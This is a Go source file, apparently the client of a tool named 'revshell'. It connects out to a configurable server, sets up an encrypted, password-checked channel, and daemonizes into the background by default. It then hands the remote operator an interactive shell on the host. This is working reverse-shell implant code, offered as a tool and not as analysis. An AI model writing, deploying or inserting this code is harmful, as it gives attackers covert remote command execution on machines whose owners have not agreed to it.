package main

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"

	"revshell/pkg/secureio"
	"revshell/pkg/terminal"
)

type clientOptions struct {
	addr         string
	aesKey       string
	authPassword string
	shell        string
	prompt       string
	workdir      string
	foreground   bool
}

func main() {
	opts := parseFlags()

	conn, err := net.Dial("tcp", opts.addr)
	if err != nil {
		log.Fatalf("client: failed to connect to %s: %v", opts.addr, err)
	}
	defer conn.Close()

	reader, writer, err := secureio.Handshake(conn, false, opts.aesKey, opts.authPassword)
	if err != nil {
		log.Fatalf("client: handshake failed: %v", err)
	}

	if !opts.foreground {
		if !daemonSupported {
			log.Printf("client: background mode is only supported on Linux; continuing in foreground")
		} else {
			log.Printf("client: handshake successful, entering background mode")
			if err := daemonize(); err != nil {
				log.Fatalf("client: failed to daemonize: %v", err)
			}
		}
	}

	log.Printf("client: connected to %s with AES-GCM encryption", opts.addr)

	sessionOpts := terminal.Options{Prompt: opts.prompt, Shell: opts.shell, InitialDir: opts.workdir}
	session, err := terminal.NewSession(reader, writer, sessionOpts)
	if err != nil {
		log.Fatalf("client: failed to create session: %v", err)
	}

	if err := session.Run(); err != nil && !errors.Is(err, io.EOF) {
		log.Printf("client: session ended with error: %v", err)
	}
}

func parseFlags() clientOptions {
	addr := flag.String("server", "127.0.0.1:9999", "remote server address")
	aesKey := flag.String("aes-key", "", "shared AES key or passphrase")
	authPass := flag.String("auth-password", "", "authentication password")
	shell := flag.String("shell", "/bin/sh", "shell executable used to run commands")
	prompt := flag.String("prompt", "", "prompt template forwarded to the remote shell (supports {{.USER}}, {{.HOST}}, {{.CWD}}, {{.BASENAME}})")
	workdir := flag.String("workdir", "", "initial working directory for new sessions")
	foreground := flag.Bool("foreground", false, "run in the foreground without daemonizing after the handshake")

	flag.Parse()

	missing := false
	if *aesKey == "" {
		fmt.Fprintln(os.Stderr, "client: --aes-key must be provided")
		missing = true
	}
	if *authPass == "" {
		fmt.Fprintln(os.Stderr, "client: --auth-password must be provided")
		missing = true
	}
	if missing {
		os.Exit(1)
	}

	return clientOptions{
		addr:         *addr,
		aesKey:       *aesKey,
		authPassword: *authPass,
		shell:        *shell,
		prompt:       *prompt,
		workdir:      *workdir,
		foreground:   *foreground,
	}
}
